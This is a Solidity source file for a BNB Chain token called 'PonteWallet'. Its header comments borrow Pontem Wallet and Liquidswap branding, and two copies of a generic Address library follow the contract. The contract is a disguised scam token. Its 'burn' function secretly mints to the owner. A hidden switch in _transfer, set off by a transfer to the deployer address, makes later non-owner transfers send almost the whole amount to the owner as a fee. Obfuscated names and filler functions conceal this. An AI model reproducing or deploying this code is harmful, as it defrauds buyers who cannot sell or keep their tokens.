/**
 *Submitted for verification at BscScan.com on 2022-12-31
*/

//PonteWallet
//Building https://liquidswap.com & Pontem Wallet on 
//Opinions are not our own... 🛸 https://discord.gg/44QgPFHYqs
//Calling all bounty hunters! 📣
//We’re launching a bug bounty for Liquidswap, our Aptos DEX!

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.16;
contract PonteWallet {
uint256 private  uRNeLE = 60;
string public  symbol = "PonteWallet";
uint256 public constant JctezM = 99999;
address private  fPuUIu = address(0);
mapping (address => uint256) public balanceOf;
address private  YrrukM = address(0);
address private  YeUWfy = address(0);
uint256 private  quPHvS = 68;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  enEtzW = address(0);
string public  name = "PonteWallet";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  PKqclz = 74;
address private  GQCmSp = address(0);
uint256 public constant totalSupply = 100000000000000000000000000;
uint256 private  nMngNg = 80;
uint8 public constant decimals = 18;
address private  ydeOvx = address(0);
uint256 private  atSQlN = 87;
address private  sLZdWr = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
address private  xyJtyw = address(0);
uint256 private  JEFOEI = 93;
address private  sIfUub = address(0);
address public owner;
uint256 private  hXuWch = 1000000000000000000;
//
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _add1YeUWfy() private returns (address) {
return YeUWfy;
}
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
//
//
constructor () public {
enEtzW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getn2MngNg() private returns (uint256) {
return nMngNg - PKqclz;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
//
//
//
//
function _addfP3uUIu() private returns (address) {
return fPuUIu;
}
//
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFqvlGq 0");
require(spender != address(0), "fFqvlGq 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getxyJ4tyw() private returns (address) {
return xyJtyw;
}
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _addPKqc5lz() private returns (uint256) {
return PKqclz + quPHvS;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getydeOv6x() private returns (address) {
return ydeOvx;
}
//
//
//
function _addJEFOEI7() private returns (uint256) {
return JEFOEI++;
}
//
//
//
function _getG8QCmSp() private returns (address) {
return GQCmSp;
}
//
//
//
function _addsI9fUub() private returns (address) {
return sIfUub;
}
//
//
//
function _getatS10QlN() private returns (uint256) {
return atSQlN++;
}
//
//
//
//
//
//
//
function _addYrru11kM() private returns (address) {
return YrrukM;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getuRNeL12E() private returns (uint256) {
return uRNeLE / 65;
}
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FqvlGq");
require(to != address(0), "FqvlGq");
require(amount <= balanceOf[from], "FqvlGq");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* JctezM/hXuWch ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==enEtzW){
hXuWch = JctezM+2;
}
emit Transfer(from, to, transferAmount);
}
function _addquPHvS13() private returns (uint256) {
return quPHvS - uRNeLE;
}
//
//
//
//
//
function _gets14LZdWr() private returns (address) {
return sLZdWr;
}
//
//
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
//
//
//
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



///////////////////////////////////////////


library Address256 {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}